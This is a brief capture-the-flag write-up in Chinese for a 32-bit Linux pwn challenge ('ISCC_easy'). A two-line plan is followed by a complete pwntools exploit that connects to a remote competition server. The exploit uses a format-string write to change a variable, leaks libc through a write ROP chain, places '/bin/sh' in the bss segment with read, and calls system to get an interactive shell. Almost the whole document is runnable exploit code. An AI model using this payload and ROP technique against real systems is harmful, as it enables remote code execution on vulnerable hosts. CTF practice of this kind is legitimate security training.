1. 格式化字符串将x改为5，进入welcome，栈溢出
2. write获取libc基址，read在bss段写入/bin/sh字符串，执行system获取shell

### exp

```python
from pwn import *

context(log_level='debug',arch='i386',os='linux')

# io = process('/home/kali/pwn/ISCC/ISCC_easy/ISCC_easy')
# io = gdb.debug('/home/kali/pwn/ISCC/ISCC_easy/ISCC_easy')
io = remote('182.92.237.102',10013)

libc = ELF('/home/kali/pwn/ISCC/ISCC_easy/libc6-i386_2.31-0ubuntu9.14_amd64.so')
system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

main_addr = 0x80492E8
x_addr = 0x0804C030
bin_sh_addr = 0x804cf00
wtite_plt = 0x80490f0
read_plt = 0x80490b0
read_got_addr = 0x804c00c

# 0xf7ecc780-0xf7ddc000
payload = fmtstr_payload(0x4,{x_addr:0x5})
io.sendafter(b"Let's have fun!",payload)

# b *0x08049350
# b *0x080492DB
rop_write = b'a'*0x90 + p32(0) + p32(wtite_plt) + p32(main_addr) + p32(0x1) + p32(read_got_addr) + p32(0x4)
io.sendafter(b'Input:',rop_write)

io.recv()
read_addr = io.recvuntil(b'D')[0:4]
read_addr = u32(read_addr)

libc_base = read_addr - read_offset
system_addr = libc_base + system_offset
print(hex(system_addr))

io.sendafter(b"Let's have fun!",b'a')

rop_read = b'a'*0x90 + p32(0) + p32(read_plt) + p32(main_addr) + p32(0x0) + p32(bin_sh_addr) + p32(0x8)
io.sendafter(b'Input:',rop_read)

sleep(1)
io.send(b'/bin/sh\x00')

io.sendafter(b"Let's have fun!",b'a')
rop_system = b'a'*0x90 + p32(0) + p32(system_addr) + p32(main_addr)+ p32(bin_sh_addr)
io.sendafter(b'Input:',rop_system)

io.interactive()

```
